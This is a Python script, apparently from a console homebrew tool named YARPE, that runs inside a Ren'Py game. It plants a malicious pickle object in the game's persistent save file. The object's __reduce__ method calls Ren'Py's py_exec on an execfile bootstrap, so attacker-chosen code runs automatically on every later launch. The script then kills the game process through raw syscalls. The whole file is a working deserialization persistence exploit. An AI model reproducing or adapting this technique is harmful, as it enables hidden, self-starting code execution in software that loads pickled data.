import pickle
import zlib
import renpy
import time
from utils.rp import log
from utils.conversion import u64_to_i64
from errors.socket import SocketError
from sc import sc
from constants import SYSCALL

PERSISTENT_PATH = "/saves/persistent"
DELAY_TIME = 10 # 10 Seconds

SCRIPT = 'execfile("/saves/yarpe_autoload/persistent_bootstrap.py")'

class Yummy(object):
    def __reduce__(self):
        return renpy.python.py_exec, (SCRIPT,)

    def __deepcopy__(self, memo):
        new = Yummy()
        memo[id(self)] = new
        return new

    def __eq__(self, other):
        return isinstance(other, Yummy)

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(SCRIPT)

SYSCALL["getpid"] = 20
SYSCALL["kill"] = 37

SIGKILL = 9


def kill_game():
    pid = u64_to_i64(sc.syscalls.getpid())
    if pid < 0:
        raise Exception(
            "getpid failed with return value %d, error %d\n%s"
            % (
                pid,
                sc.syscalls.getpid.errno,
                sc.syscalls.getpid.get_error_string(),
            )
        )

    ret = u64_to_i64(sc.syscalls.kill(pid, SIGKILL))
    if ret < 0:
        raise Exception(
            "kill failed with return value %d, error %d\n%s"
            % (
                ret,
                sc.syscalls.kill.errno,
                sc.syscalls.kill.get_error_string(),
            )
        )

def main():
    log("=== YARPE: Injecting YARPE into persistent renpy file. ===")
    log("WARNING: This modification will make the game UNPLAYABLE until you reset/delete the persistent save file.")
    log("Also, the save needs to be located on slot 1-1(1-1-LT1.save).")
    log("Turn off the game now to cancel the process.")

    # Give user some time to think about it.
    time.sleep(DELAY_TIME)

    p = renpy.game.persistent

    # ---------------------------------------------------------
    # Inject the Yummy trigger
    # ---------------------------------------------------------
    log("Injecting YARPE trigger into persistent object...")

    p.yarpe_trigger = Yummy()
    p._changed["yarpe_trigger"] = True   # Forces Ren'Py to rewrite persistent safely

    # ---------------------------------------------------------
    # Re-pickle persistent (protocol 2) and recompress
    # ---------------------------------------------------------
    log("Serializing modified persistent...")

    try:
        raw_data = pickle.dumps(p, protocol=2)
    except Exception as e:
        log("ERROR: pickle.dumps failed: %s" % e)
        return

    try:
        compressed_data = zlib.compress(raw_data)
    except Exception as e:
        log("ERROR: zlib.compress failed: %s" % e)
        return

    log("Compressed persistent size: %d bytes" % len(compressed_data))

    # ---------------------------------------------------------
    # Write persistent back to disk
    # ---------------------------------------------------------
    log("Writing modified persistent to disk at %s..." % PERSISTENT_PATH)

    try:
        with open(PERSISTENT_PATH, "wb") as f:
            f.write(compressed_data)
    except Exception as e:
        log("ERROR: Failed to write persistent file: %s" % e)
        return

    log("YARPE trigger installed successfully. Exploit will autoload in the next game launch.")
    log("IMPORTANT: The game will not function normally until the persistent save is reset!")

main()
log("Press X(or O) to exit the game.{w}")
kill_game()
